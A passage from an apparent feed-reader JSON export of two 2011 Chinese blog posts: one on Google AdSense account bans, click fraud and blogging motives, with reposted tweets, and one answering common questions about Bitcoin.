起商量核算出来一个新的数字。对于大部分广告投放来说，广告主发言权比较大，因为他们掌握着钱，于是他们常常会按照经验少给对方一些钱，或者要求对方补做多长时间的广告，这个就叫扣量。</p>\n\n<p>看到了传统广告（其实互联网广告也不算太传统了）是怎么玩的，就很容易理解，没有什么广告比Google AdSense再简单了。对于传统的广告，看上去赚钱很多，但每个环节都要消耗大量的人力成本，这种广告是不可能让小网站赚到钱的。大网站面对大广告客户，能值回这些人工成本，小广告主或小网站则完全不划算，他们能赚到的钱甚至连这些人力成本都不够，更别说利润。可以说，如果没有AdSense，小网站是拿不到任何广告的，除非你自己想办法去搞定各种关系，拿到广告订单，有谁能轻松做到这些？</p>\n\n<p><br>\n<h2>二 Google 怎么做</h2></p>\n\n<p>众所周知，Google很多年前是个技术很好但不赚钱的公司，直到后来找到了广告的盈利模式，才变成了现在的科技巨头。Google崇尚使用机器和算法，不愿意依靠太多人力。最终Google使用了AdWords这种广告模式，其核心在于内容针对匹配，自助发布，按照点击计费，价格透明。和前面所说的广告模式相比，这是颠覆性的模式。在这种模式中，竟然没有中间商存在的空间，广告价格、位置排列、发布过程，全被机器取代，而且价格更准，费用更低。中间没有了人力成本，这种模式就变得可以复制和爆炸性增长，除了Google自己网站搜索结果右侧和顶部的广告，他们还通过AdSense这种方式投放到其他网站上。这就给了很多网站一个获得广告投放的机会。</p>\n\n<p>特别注意，这种模式之所以能出现并盈利，主要原因就是工作都由机器完成而非人工。如果有了人的参与，除了人力价格问题，人也会倾向于去寻找利润更高的客户，如果和不同规模的网站签约和客服成本差不多，收益却相差很大，人自然会更愿意把同样的时间和精力花在赚钱更多的网站上，这样就回到了前面所说的广告困难，小网站没有任何机会。</p>\n\n<p>Google的广告同样也涉及效果和作弊。从前面的描述可以看出，如果Google不能有效的让机器来反作弊，这个模式就崩溃了。在这个模式中，除了非常重要的大发布商或专业发布商，Google必须倾向广告主，因为只有广告主投了钱，整个模式才能运转，如果广告主认为Google广告效果不够，那么模式也要崩溃。</p>\n\n<p>基于以上两点，Google的反作弊模式必然是优先保护广告主利益，提供自动而且严格的反作弊。作弊这个词有贬义，在Google的官方文档中，通常使用\"无效点击\"这个词。这样现在大家看到的现象就非常好解释了，Google无法提供人工客服给小网站，那样等于是赔钱，与其赔钱，还不如不要这个小网站的广告流量。Google会尽量识别作弊，但任何技术都有准确性，这种技术不能保证100%准确，所以一定会有网站被误伤。对于足够大的网站，或许Google能通过一些方式协调扣除部分无效点击，对于小网站，这么做的结果还不如直接封杀。</p>\n\n<p>这是这种商业模式必然的结果，谈不上作恶或不作恶。我承认对于完全没作弊而被封的网站本身，这是不公平的，他们也会认为Google在作恶。这应该是一个\"艰难的选择\"，虽然损失了一些人的利益，但大部分人，无论广告主还是发布商都因此受益。Google应该非常清楚这些，所以Google AdSense的合作协议和常见问题中都明确指出了\"Google 保留以任何原因（包括来自任何来源的无效点击活动）停用任一帐户的权利。\"</p>\n\n<p>我非常同意AdSense并不是最好的系统，也不是最好的模式，它有缺陷，并不严谨，会有误伤。但也得承认，这是目前存在的最好方式，对于广告主和发布商都是最好的模式。对于广告主，价格透明，节约成本，效果明确，方便，一次投入成本很低。对于发布商，简单，不限制规模，多少能赚点钱。除此之外，还有其他公司能提供这样的模式吗？没有了，就算曾经有也死掉了。</p>\n\n<p>因为大规模使用了机器，所以哪怕是一个个人，也可以当作广告主，通过Google的广告系统宣传自己的产品，同样就算是一个个人也可以当作发布商，在自己的网站上发布广告。这种做法确实改变了世界，这种做法允许哪怕一个人这么小的单位，有机会参与到广告投放，发布，盈利的过程中，把广告行业的参与者扩大到了前所未有的范围。今天被封杀的人当然会觉得懊恼，但如果换个角度，你是广告主，会不会因为被退回了一笔广告费而惊喜？</p>\n\n<p>对于Google来说，这是帝国的基石，除非到更好的办法，否则不可能改变现在的模式。</p>\n\n<p>小小提示一点，大家应该都知道不要点击自己的广告，但你有没有认真看过AdSense的所有相关资料？最重要的《<a href=\"http://www.google.com/adsense/support/bin/topic.py?topic=8420\">AdSense 基础知识</a>》，特别是《<a href=\"http://www.google.com/adsense/support/bin/topic.py?topic=8423\">AdSense</a> 合作规范》其中的《<a href=\"http://www.google.com/adsense/support/bin/topic.py?hl=zh-Hans&amp;topic=8426\">无效点击和展示</a>》部分。如果你不了解一个系统，就不可能正确的应用它。这些文档中提供了很多东西，在我看来，很多放AdSense的网站都是违反规范的，被封也是早晚的事，如果Google愿意投入足够的人工客服，他们应该可以一个个指出你哪里做错了。</p>\n\n<p>当然这些规范就算都做到了，也不能保证一定不被封，不过总会让几率降低一些吧。对于访问量偏小，扰动起来容易的个人网站，更应该认真阅读这些资料。</p>\n\n<p>读这些东西很费时间，但做什么事情不需要时间呢？天下没有什么事情是\"轻松赚钱\"的，所有事情都要投入足够的时间和精力。AdSense并不是一种轻松赚钱的方法，同样有许多东西需要学习。</p>\n\n<p>Google从来没隐藏过这些信息，无论是申请AdSense的TOS或者这些相关资料，都多次明确指出Google有权停止帐号，并且不给出任何信息。这也并不是\"霸道\"，和Google其他算法（比如反垃圾，反内容农场，排名）一样，这些算法都是保密的，因为一旦公布，人们就更容易找到对付算法的办法。很多企业都不会公布具体的审核标准，比如Paypal如何认定欺诈，至今仍然保密。既然签署了TOS，理论上是应该仔细阅读过的（虽然很多人根本不看），Google已经充分提示了各种风险，所以这是信息完全公开，平等的商业合作，和Google是否作恶没关系。如果在接受一个商业合作之前了解清楚，读完资料，至少不会和现在这几位一样大喊\"天啊，我怎么会被封...\"。但想想买来东西会读说明书的人也不多，更别说这么长的文档了。请问，这要怪谁？</p>\n\n<p>twitter上的<a href=\"http://twitter.com/newsinchina\">@newsinchina</a>最近发表了不少关于AdSense的心得，基本都是正确的，而且切中要害，有兴趣的同学不妨去看看。好玩的是，这位同学的正职工作和IT一点不沾边，但是他对AdSense的了解远远超过了很多自认为是IT圈的人，包括最近被封的这几位。在各位觉得AdSense被封属于晴天霹雳的时候，看到一个圈外人比你们更了解这系统，脸红吗？</p>\n\n<h2>三 中国的问题</h2>\n\n<p>所有模式在中国，都需要另外解释一下。中国确实是一个与众不同的地方。</p>\n\n<p>Google Adsense刚刚开放中国市场之后的一段时间，是封杀帐号最厉害的一段时间，我想Google可能从来没见过作弊这么凶猛的市场，对于其他国家，用人力去点击广告获得收入不是特别划算，但在中国，人们可以去三级城市以下雇非常便宜的劳动力来做这件事。</p>\n\n<p>后来的事情好玩了，这些事情背后的策略我没有直接证据，但根据现象，还是能推测出来一些东西的。之后的几年随着李开复在谷歌政策的推行，有几年的时间几乎没有听到帐号被封的情况。与此同时，Google在中国有了广告代理商，不再是自助投放。记忆力好的用户大概还记得，这几年的AdSense广告质量低劣，匹配非常差，还有大量的图片广告。这些图片在不同网站看上去都是一样的。整个系统看上去不再像内容针对广告，反而像其他广告联盟做的那种Banner广告。同时，李开复在各种场合反复提到谷歌中国的广告收入正在快速提高。就是在那个时候，我<a href=\"http://blog.devep.net/virushuo/2007/04/19/remove_google_adsense.html\">撤掉了这个blog上的AdSense广告</a>。</p>\n\n<p>这几件事放在一起看，会很有趣。首先，反作弊力量下降，那么广告主就会损失更多的钱，对应下来就是广告的投放成本变高。随之带来的就是小广告主无法承担，只能不做了，不在乎价格高的广告只有医疗广告或者干脆骗人的广告。谁去寻找这种不在乎花钱的广告主？只有靠代理商的线下交易了。</p>\n\n<p>但总之谷歌是能赚更多的钱了，发布商也能赚更多的钱了，代理商也赚钱了，看起来是好事？当然不是好事，这样的做法是损害Google生存的基础，把一个科技巨人变成了恶劣的广告联盟。 </p>\n\n<p>一转眼就是几年，大家都相安无事。为什么现在突然出现了大面积的Adsense帐号被封？是什么在发生变化？</p>\n\n<p>今年对于Google是非常重要的年份，创始人拉里·佩奇重新接任了CEO。如果平时留意，可以从各方面看到Google和前几年的区别，动作更快，更有活力，无论是决策还是产品发布，速度都快了很多，Google似乎回到了创业时期最好的状态。对于一个这样规模的公司，这可真不容易。</p>\n\n<p>加强对AdSense的管理，大概也是这一系列改变中的一种吧。我没有证据，但从时间和逻辑上推测，这是合理的。</p>\n\n<p>中国的blog们叫喊不公平的时候，不知道他们是否考虑过，中国是广告点击欺诈最严重的地区。我甚至直接认识的人中就有在二级城市靠点广告分成赚钱的，他们有几十人的规模，每天只做一件事就是点广告。他们有各种技巧，让点击起来真实，不容易被发现。就算比点击广告更严格的效果计费广告，也有我前面说的那种人工注册游戏帐号办法，这方面，中国人有丰富的经验。在这样一个市场上，误杀就更加难免了。我并不是认为误杀是合理的，但是，又能有什么办法呢？</p>\n\n<p>极端一点看，我认为这是Google走向好转的开始。前面几年Google有点令人失望，谷歌就更不用说了。现在一切都重新走向规则和有序，长期看来前景看好。（如果你有美股投资的能力，买入GOOG吧）</p>\n\n<h2>四 blog的投入和选择</h2>\n\n<p>最后简再说一下关于blog的选择问题。我是03年年开始写blog的，到现在有8年多（我不会用什么\"第九个年头\"这种词显得自己更早一些），算是中文blog中比较早的，比我更早的人，我都能数的出来。前面提到过，我曾经放过一段时间AdSense广告，到07年撤掉了，之后再也没放过。</p>\n\n<p>最早放AdSense广告更多的还是偏好玩和观察，广告质量下降之后，我认为广告收益远远低于对我blog的品牌造成的损失，我也不愿意让看我blog的人看到太不靠谱的广告。这样撤掉就是非常直接的选择。</p>\n\n<p>blog给我带来的好处不少，比如记录和整理了一些东西，对个人成长有帮助，认识了不少朋友，让别人更了解我的特点，合作的时候会顺畅很多，这些都是无形资产。有形资产也有，比如因为blog而得到的项目，获得的媒体约稿等等。除此之外，当我要宣传自己的产品时，blog也对我有很大帮助。</p>\n\n<p>我身边认真写blog的朋友不少，他们基本都是原创，很少有摘抄型的，这些家伙获得的好处比我更大，有的出书，有的出名，有的彻底改变了自己的生活。</p>\n\n<p>我非常没法理解这次被封的两位，一位干脆直接关站，另外一个为得不到每年400美金的广告费不知所措。难道他真的认为他的名气和机会完全是因为自己足够nb而出现的，并不是blog带来的吗？</p>\n\n<p>blog是一种兴趣，也是一种生活态度，或许我们可以不这么功利的看待这件事，创造并不是一种痛苦，而是乐趣。有一类blog主要内容就是摘抄，他们确实需要保证一定的发表量，这是有点累，但这不也正是他们自己的选择吗？</p>\n\n<p>最后，为了表示对一定给blog找个盈利方式这种短视行为表示<strong>讽刺</strong>，我决定为blog文章接受<a href=\"http://www.bitcoin.org/\">bitcoin</a>捐助，bitcoin是一种完全虚拟的货币，确切的说，是一种利用p2p网络产生和分发的虚拟货币。对这个话题有兴趣的可以看云风写的这篇 <a href=\"http://blog.codingnow.com/2011/05/bitcoin.html\">Bitcoin 的基本原理</a>，非常有趣的。</p>\n\n<p>我的bitcoin address 是 1Gq9Kqt55vTGtxHYAmPiLtS8bw9dAzoosx ，现在网站 <a href=\"https://freebitcoins.appspot.com/\">https://freebitcoins.appspot.com/</a>正在免费派发bitcoin，每个gmail帐号给0.02个BTC（bitcoin货币单位），你去拿了然后送给我0.01我就很开心了。</p>\n\n<p>关于这个话题还可以看看<a href=\"http://guao.hk\">谷奥</a>创始人<a href=\"http://twitter.com/gokeeper\">gokeeper</a>写的<a href=\"http://b.gkp.cc/2011/05/17/about-chromi-adsense-account/\">说说 AdSense 帐号被封和写 blog 的心态</a></p>\n\n<p>---------------------------------<br>\n附：考虑很多人上twitter不那么方便，经过@newsinchina授权转载他发的关于AdSense的推过来。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70395975189020672\">http://twitter.com/NewsInChina/status/70395975189020672</a></p>\n\n<p>小心翼翼地看着几个IT大拿在讨论ADSENSE封号事件.作为非IT人士但也有ADSENSE帐号的用户,我也说说我的看法.1中文博克实在不适合放ADSENSE,因为广告匹配太差.如果要靠这个赚钱,最好是某个专业产品的网站,比如:美容,养生等.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70396372167303168\">http://twitter.com/NewsInChina/status/70396372167303168</a></p>\n\n<p>2.ADSENSE在英文站匹配的非常好,根据你的内容.但在中文站一塌糊涂,无论你写的什么内容,总是出现些男性健康/整容广告,所以你还不如索性就做这一类的网站.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70396879078297600\">http://twitter.com/NewsInChina/status/70396879078297600</a></p>\n\n<p>3.据我所知,通过ADSENSE赚到钱(这里指的是挺多的钱)的网站是有的,但都是商业类站点,个人中文BLOG我还真没听说过能靠这个赚到钱.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70397833865478144\">http://twitter.com/NewsInChina/status/70397833865478144</a></p>\n\n<p>4.ADSENSE团队是重视和他们认为重要的网站的关系的,可以享受GOOGLE专员电话指导和咨询.比如某个美容/化妆品题材之类的网站.GOOGLE绝对不会乱封他们的帐号,而且会和指导这些站如何放置ADSENSE代码更有效.就是广告位的设置.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70398800447025152\">http://twitter.com/NewsInChina/status/70398800447025152</a></p>\n\n<p>5.ADSENSE是极力建议他们认为有前途的商业站点定向投放ADSENSE广告的.举个例子,你的汽车类站点作的不错,ADSENSE就会联系你在你的站定向投放福特汽车公司的广告,这样的CPC会高的多.当然这个待遇只针对那些GOOGLE看中的网站.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70399290677272576\">http://twitter.com/NewsInChina/status/70399290677272576</a></p>\n\n<p>6.ADSENSE看中的是一个网站的商业价值,这决定在这个网站的广告价值,GOOGLE也要对广告商花的钱负责.很遗憾,绝大部分个人中文BLOG根本不会被GOOGLE重视,这些站点的各种作弊也令GOOGLE头痛.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70400395205287936\">http://twitter.com/NewsInChina/status/70400395205287936</a></p>\n\n<p>除非你是被ADSENSE看上的重要的有价值的网站(月光博克属于这类,曾被ADSENSE作为范例教材),否则你的中文网站的ADSENSE广告点击将十分不值钱,一个点击1美分很常见.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70401066004520960\">http://twitter.com/NewsInChina/status/70401066004520960</a></p>\n\n<p>8.被ADSENSE封杀了帐号,确实毫无办法,只能自认倒霉.作为个人站长,只能做到自己不做任何违背TOS的事情,但是对于TOS的理解,这个谁说的清.如果哪一天我被封号,我也只能自认倒霉.但我依然要说,截至目前,ADSENSE是最好的广告商,没有更好的选择.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70401930874200064\">http://twitter.com/NewsInChina/status/70401930874200064</a></p>\n\n<p>9.如果你是个人纯BLOG,自己写着玩的,我觉得你挂着ADSENSE可以,但就当这玩艺和钱无关就好了.如果你真指望靠这个赚钱,这不是不可以,那你自己就要动脑子在你的网站上,这就是以广告赚钱为目的的BLOG,定位就和纯粹个人BLOG不同.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70402622045159425\">http://twitter.com/NewsInChina/status/70402622045159425</a></p>\n\n<p>10.举个例子,我是卖WORDPRESS主机的,为了业务我也会在GOOGLE做广告,我的设定是每次有效点击0.40元.如果你做的个人BLOG是针对WP主题的,这时候我的广告出现在你的站,匹配度很高,有人点击我的广告,GG至少会分其中的2毛给你.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70403272422342656\">http://twitter.com/NewsInChina/status/70403272422342656</a></p>\n\n<p>11.一个美容减肥的ADSENSE广告出现在一个美容类网站上,这样的点击很有效,各方都满意.同样这个广告出现在你的个人IT内容的BLOG上,如果这个广告被点击,很可能就被视作无效,次数多了,广告商不满意,GG可能就判断你作弊了,其实你很冤枉.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70403828700299264\">http://twitter.com/NewsInChina/status/70403828700299264</a></p>\n\n<p>ADSENSE经常封杀中文站的帐号,我认为根本原因还是广告匹配度太差所致.广告商看到被扣了很多钱,却没有生意,就会投诉GG,GG的调查结果往往就是站长作弊,所以封号.实际上是广告匹配本来就很差,风马牛不相及.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70404634090553344\">http://twitter.com/NewsInChina/status/70404634090553344</a></p>\n\n<p>有些中文博主既想做纯粹的抒发各种个人感想的BLOG,心里又想赚点钱或者希望这个ADSENSE帐号不被K,其实我的建议是从你的BLOG拿下ADSENSE帐号.否则哪天被K了又会纠结.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70405355796045825\">http://twitter.com/NewsInChina/status/70405355796045825</a></p>\n\n<p>月光博克可以作为一个榜样,月光定位的是IT资讯,ADSENSE广告也都是这方面的,匹配度高.这样的站被封杀的可能很低.你可以去做个专门的IPHONE内容的BLOG,只要专业有深度,都有望从ADSENSE赚点钱,而且被杀概率低.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70405713666641920\">http://twitter.com/NewsInChina/status/70405713666641920</a></p>\n\n<p>最容易被ADSENSE干号的网站内容:万金油似的内容包罗万象的个人BLOG,毫无专业性;大量转贴转载或者改写其他网站原创内容的.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70407640345362432\">http://twitter.com/NewsInChina/status/70407640345362432</a></p>\n\n<p>我坚持认为即使是中文个人BLOG,只要你能做到内容有一定的专业性着重于某个领域,内容保持原创.你的ADSENSE收入可能依然不高,但是你被K号的几率小的多.因为你的网站广告匹配度必然会比那些万金油似的啥内容都有的网站好的多.</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70408430426394624\">http://twitter.com/NewsInChina/status/70408430426394624</a></p>\n\n<p>最后友情提醒:如果你的中文BLOG的内容属于包罗万象的,比如你今天发表一篇关于瓜子的;明天发表一篇肉蒲团的,后天来一篇特供蔬菜或者IT内容的.那么请赶紧撤下你的ADSENSE,等你想到好的niche之后再投放广告.毕竟申请这个不就是为了赚点烟钱吗?</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70690425974964224\">http://twitter.com/NewsInChina/status/70690425974964224</a></p>\n\n<p>继续谈adsense:你的ADSENSE收入来源于在GOOGLE投放广告的广告商，GOOGLE会分一半左右的钞票给你，所以每个广告的点击，广告商都要付费。所以广告商很重视ROI（RETURN ON INVESTMENT），这也是广告商选择广告平台的最重要考量</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70690559567732736\">http://twitter.com/NewsInChina/status/70690559567732736</a></p>\n\n<p>GOOGLE在这方面一直是对广告商高度负责的，玩过ADSENSE的人都知道，ADSENSE每个月结算时都会修正你的ADSENSE收入。我听说过的最牛逼得是把一哥们的3000刀修正为150刀，所谓修正就是ADSENSE去除无效点击将这部分钱还给广告商。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70690771292004352\">http://twitter.com/NewsInChina/status/70690771292004352</a></p>\n\n<p>对于广告商而言，他们的广告出现在与他们的广告相关的网站内容上，这时候的点击的ROI自然就高。反之出现在与其广告内容毫不相关的网站上（比如杂乱无章的个人BLOG），其广告的ROI自然就会非常差。这也是有些喜欢作弊者喜欢用导流量的方法来赚钱，但很快被K的根本原因。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70690868255916032\">http://twitter.com/NewsInChina/status/70690868255916032</a></p>\n\n<p>中文ADSENSE广告的匹配度非常差，很多时候确实站长自己没有任何违规，但也确实从你的网站产生了大量对广告商毫无用处的无效点击，他们不满意就会向GOOGLE抱怨，他们是GOOGLE的衣食父母，GOOGLE很重视。所以这就产生了大量帐号被K。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70690961554014208\">http://twitter.com/NewsInChina/status/70690961554014208</a></p>\n\n<p>ROI是K号的最重要考量，现在ADSENSE技术提高了，对于恶意点击或者站长自己的错误点击自己的广告，ADSENSE已经可以识别，在这方面误杀的可能不大。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70691046463504384\">http://twitter.com/NewsInChina/status/70691046463504384</a></p>\n\n<p>GOOGLE采用的是对申诉基本漠视的态度。其实换一个角度看，GOOGLE也没法认真对待每一个申诉，否则他们的工作量太庞大，这是不可能的任务。毕竟和百度、阿里相比，ADSENSE还是非常不错的，没有比ADSENSE更好的选择。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70691186473578497\">http://twitter.com/NewsInChina/status/70691186473578497</a></p>\n\n<p>如果要避免帐号被K，最重要的还是要选择自己的博客内容方向（如果你确实想赚点ADSENSE的钱），这一点不容易，你要动脑子。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70691247211282433\">http://twitter.com/NewsInChina/status/70691247211282433</a></p>\n\n<p>只要你的站点内容有一定的专业性，FOCUS在某一个领域，那么你的站点的ADSENSE广告匹配度会高的多，你站点上的ADSENSE广告的ROI也因此会高，而你的ADSENSE帐号被K的可能性则小的多。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70691370054074369\">http://twitter.com/NewsInChina/status/70691370054074369</a></p>\n\n<p>最后建议：想靠ADSENSE赚钱的，还是花点心思考虑英文站吧，同样都是网民。我不得不说欧美澳网民（全球就属这仨地方点击值钱，神马中东地区、印度、中国的流量堪称垃圾流量）素质更高，他们点击ADSENSE广告的热情更高，同时恶意点击甚至COPY别人代码搞破坏的情况极少。</p>\n\n<p><a href=\"http://twitter.com/NewsInChina/status/70691628775522304\">http://twitter.com/NewsInChina/status/70691628775522304</a></p>\n\n<p>而国人的行为习惯大家都清楚，甚至于我认为一个成功的中文ADSENSE赚了钱的网站都必须低调，不要让无关人士知道你的站，否则恶意点击/COPY会终结你的ADSENSE，你也无可奈何。对此我只能SIGH一声！</p>\n\n<p>---------------------------------</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370751273",
    "timestampUsec" : "1313370751273005",
    "id" : "tag:google.com,2005:reader/item/a508b942ae3939bb",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "关于bitcoin若干问题我的看法",
    "published" : 1306137427,
    "updated" : 1306148230,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/05/23/bitcoin.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最近关于bitcoin突然在中文圈子火了起来，似乎是引爆点到了。半年前我也下载过，但是没弄明白怎么用，说回头看看wiki，放在一边就给忘了。现在想来悔不当初，当时如果下手估计也能弄到几百个吧...</p>\n\n<p>这个项目非常有趣，或者说非常酷，而且前所未有。我对bitcoin的态度是强烈支持，并且希望它成功。我愿意接受bitcoin付款购买我的软件什么的。云风的文章是目前对bitcoin原理说的最清楚的，不过四处还有不少疑问，我把常见疑问汇总起来，按照我的理解做个回答，算补疑。本人计算机还行，数学一般，经济学不懂，所以也有可能有错，大家可以继续拍砖。</p>\n\n<h2>1 信用从哪保证</h2>\n\n<p>人们最常考虑信用问题，比如说，现在货币是政府担保，bitcoin谁来担保？在有纸币之前，人们只是在自然界寻找那些\"不容易获得\"的资源做为等价物，比如贝壳。后来才使用贵金属。再后来纸币和贵金属挂钩，最后脱钩，最后这几步就是最近几十年的事。</p>\n\n<p>现在大家以为纸币是有信用担保的，某种意义上说没错，各国央行提供了这种担保。但另一个角度看来，这种信用担保完全靠不住。现在的通货膨胀和紧缩，经济好或者不好，都和央行如何发行货币相关，或者更确切的说，和美联储有关。谁来担保他们不去乱发货币？</p>\n\n<p>人们对纸币的贬值表示担心，会买入大量的贵金属以期望\"保值\"，说明人们也并不信任目前的货币体系。换到bitcoin这，机器和算法保证了bitcoin无法被任意超发，如果要更改算法，就要p2p网络上的大部分节点都换成新的算法，否则就毫无意义，换言之，bitcoin的信用是靠使用bitcoin的人本身来保证的。从这个意义上说，bitcoin比央行信用的靠得住。</p>\n\n<p>你永远也不知道各国央行背后干了什么，即将干什么，但是你能明确的看到bitcoin的代码，知道算法和一切细节。哪个更有信用？</p>\n\n<h2>2 bitcoin是否能和经济总量匹配，不匹配是否能造成通胀</h2>\n\n<p>bitcoin的货币单位BTC，按照目前的算法，最多可产生2100万个（可能需要100年...），这和目前的世界经济总量确实不匹配。但是我认为把BTC和经济总量对比并无意义，目前的经济总量是用纸币（比如美元）衡量的，这种衡量方法本来就不是真正的\"经济总量\"，或者说经济总量这个词对于bitcoin体系来说毫无意义。</p>\n\n<p>其实应该把这个问题换一下，就是BTC是否够用。这个问题也不用担心。目前BTC显示的是小数点后2位，其实内部存储了小数点后8位。也就是2100万*10^8，这个数字已经大的吓人了。这背后的意思是说，BTC可以看作无限可分的，如果存量稀少，人们就会采用更小的单位，比如0.00001BTC能买到一瓶可乐，如果存量过多，人们会采用更大的单位，比如10BTC能买一瓶可乐。</p>\n\n<p>其实黄金也可以这么用，只不过黄金并不是真正的无限可分，不好携带也不好转移，事实上没办法真的这样使用。</p>\n\n<p>因为没有滥发货币的央行，所以也就没有快速恶性的通胀了。BTC的产生速度稳定，人们就可以在较长时间内使用一种合理的单位来给商品和服务定价，这种价格是相对稳定的。</p>\n\n<h2>3 bitcoin是否容易损失或者被盗？</h2>\n\n<p>这个问题在 <a href=\"https://en.bitcoin.it/wiki/Securing_your_wallet\"> https://en.bitcoin.it/wiki/Securing_your_wallet </a>中有详细说明</p>\n\n<p>概括一下，其实你只需要保证自己的wallet.dat文件存在，你的钱就不会损失。因为bitcoin系统中，你拥有的货币数量是根据交易单计算出来的，而交易单存在在整个p2p网络中。就算你的计算机坏了，只要你保存了wallet.dat，就能够重新取得交易单，你的钱也就并不会少。</p>\n\n<p>至于被盗，如果你的wallet.dat被别人拿走了，那确实会被盗。这个文件事实上是私钥。所以应该保护好这个文件。刚才哪个链接中提供了各系统中安全保管此文件的办法。保证一个文件安全的方式有很多，也可以考虑干脆使用truecrypt加密，这个足够安全了。</p>\n\n<p>加密之后的文件可以存到邮箱或者其他云存储系统中，也就不担心损坏了。你还可以建立多个wallet.dat，每个里面存一点钱，分别存放在不同的地方，这样就算丢失一个损失也不大。</p>\n\n<p>现实中一样有丢钱包，信用卡被盗刷，网银被盗等等问题会导致财产损失。bitcoin反而现实安全很多，现实中你几乎没办法去增强自己网银的安全级别，但bitcoin的wallet倒是有很多办法。</p>\n\n<p><br>\n<h2>4 bitcoin的发行是胡乱发的吗？</h2></p>\n\n<p>很多人说美联储虽然增加货币供应，但并不是满大街随便找个幸运的家伙就塞一笔钱，而是去发行国债或者变成银行贷款。但bitcoin是在计算的过程中碰上的，好像是随便发的。</p>\n\n<p>这里存在一个误解，Bitcoin的mining过程并不是在空做计算寻找随机数，而是在做交易单处理，这种处理保证了整个体系的正常运转，这就是mining的人正在做的事情，他们耗费运算资源来保证交易正常进行，并且有一定机会获得回报。这也是劳动获得的回报，就像最早挖金矿的人，他们获得金子并不是凭空获得的，也是付出劳动之后的回报。</p>\n\n<h2>5 bitcoin体系安全性如果出了问题怎么办？</h2>\n\n<p>bitcoin依赖公私钥存在，对于足够大的公私钥体系，目前还没有破解或破坏的办法，要伪造的唯一办法就是去穷举，这在时间和计算资源上都非常不划算。（比如说，100年时间伪造出来一对公私钥？）</p>\n\n<p>假如公私钥体系真的在数学上被找到了漏洞，可以大量伪造，那时候倒霉的可不光是bitcoin，整个社会都要崩溃。目前人类社会太多的地方依赖这种加密体系了，包括银行。所以说，bitcoin在安全性上仍然超过（至少不低于）目前的银行系统。</p>\n\n<h2>6 人们为什么会接受bitcoin？</h2>\n\n<p>人们接受bitcoin只是因为他们喜欢。比如我就喜欢，所以我愿意接受。一种等价物，只在于愿意承认他的人有多少。就算是货币，比如说美元，是世界通用的货币，但是你在中国，到楼下的便利店中用美元现金买一瓶饮料，能成功吗？同理，人民币目前有巨大的升值期望，但你拿人民币现金到美国超市购物，能成功吗？所以说任何等价物，包括货币，都是在有限范围内被认可的。目前在geek/hacker中，BTC正在逐渐被认可，这是一个好的趋势。</p>\n\n<p>bitcoin论坛上有各种BTC为基础的生意，看起来还不错。以后应该会越来越多的人愿意使用BTC。</p>\n\n<p>ps: 我昨天晚上在论坛上做了个小生意，赚了1BTC。为这个生意劳动耗时大约20分钟。如果用我的MBP挖到1BTC，大约需要5天。所以说，让系统尽快正常流通起来，大家就都有钱用了。</p>\n\n<h2>7 bitcoin为什么不可追踪</h2>\n\n<p>bitcoin的收款地址是可以随便创建的，wallet也可以随便创建。而且bitcoin软件本身就会在你每次收款之后生成一个新的address，下次你就应该使用新的（旧的当然也可以用）这就让追踪钱的转移变的非常困难（虽然一切都公布在p2p网络中），对应到具体的人更是困难，至少比现有金融系统困难的多的多。</p>\n\n<p><br>\n<h2>8 bitcoin要耗费大量运算资源，是不是太不低碳了？</h2></p>\n\n<p>你知道现在为了维持货币存在，人类需要浪费多少资源吗？虽然bitcoin耗费能源，可总没有那些机构耗费的多...</p>\n\n<p><br>\n我发了条推说：\"<a href=\"http://twitter.com/virushuo/status/72564906230165504\">或者说可以把BTC当作一个大游戏，其实wow金币也有一定虚拟货币的特征，但没有担保方法，没法控制滥发货币，也没法保证一直存在，blz一脑抽把业务停了，所有的金币都没了。bitcoin不会出现这种情况。</a>\"</p>\n\n<p><a href=\"http://twitter.com/soulhacker\">@soulhacker </a>回答：\"<a href=\"http://twitter.com/soulhacker/status/72569083278798848\">WoW 金币一度是很硬的通货（和人民币有相当稳定的汇率），但是后来玩家找到了增发的手段于是通胀贬值，而且随着 WoW 的越来越休闲和快餐化增发和通胀不断加速...</a>\"</p>\n\n<p><br>\n最后，很多问题的提出，根本上都是不理解bitcoin的运作方法，还是推荐好好读云风这篇<a href=\"http://blog.codingnow.com/2011/05/bitcoin.html\">Bitcoin 的基本原理</a></p>\n\n<p><br>\nupdate: 